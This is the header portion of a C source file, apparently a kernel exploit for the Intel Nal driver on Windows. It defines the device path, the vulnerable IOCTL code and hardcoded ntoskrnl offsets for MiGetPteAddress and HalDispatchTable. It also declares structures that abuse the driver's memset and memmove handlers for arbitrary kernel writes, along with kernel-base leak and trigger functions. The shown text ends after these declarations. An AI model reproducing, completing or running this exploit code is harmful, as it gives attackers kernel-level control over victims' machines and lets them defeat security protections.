#include <Windows.h>
#include <stdio.h>

#define DEVICE "\\\\.\\GLOBALROOT\\Device\\Nal"
#define TARGET_IOCTL 0x80862007

#define MI_GET_PTE_ADDRESS_PLUS_0X13_OFFSET 0x222073
#define HAL_DISPATCH_TABLE_PLUS_0X8_OFFSET 0xC00A68

int main(int argc, char** argv);
void trigger_vulnerability(HANDLE h_nal, unsigned long long nt_base_address, unsigned long long* pte_address);

unsigned long long leak_ntoskrnl_base_address(HMODULE h_ntdll);

typedef struct _MEMSET_INPUT_BUFFER
{
	unsigned long long JumpTableCode;	// Offset: 0x0 (0)
	unsigned long long Padding1;		// Offset: 0x8 (8)
	unsigned long long Value;			// Offset: 0x10 (16)
	unsigned long long Destination;		// Offset: 0x18 (24)
	unsigned long long Length;			// Offset: 0x20 (32)
} MEMSET_INPUT_BUFFER, * PMEMSET_INPUT_BUFFER;

typedef struct _MEMMOVE_INPUT_BUFFER
{
	unsigned long long JumpTableCode;	// Offset: 0x0 (0)
	unsigned long long Padding1;		// Offset: 0x8 (8)
	unsigned long long* Source;			// Offset: 0x10 (16)
	unsigned long long* Destination;	// Offset: 0x18 (24)
	unsigned long long Length;			// Offset: 0x20 (32)
} MEMMOVE_INPUT_BUFFER, * PMEMMOVE_INPUT_BUFFER;

typedef unsigned int(__stdcall* NtQueryIntervalProfile)(
	unsigned int      ProfileSource,
	PULONG            Interval
	);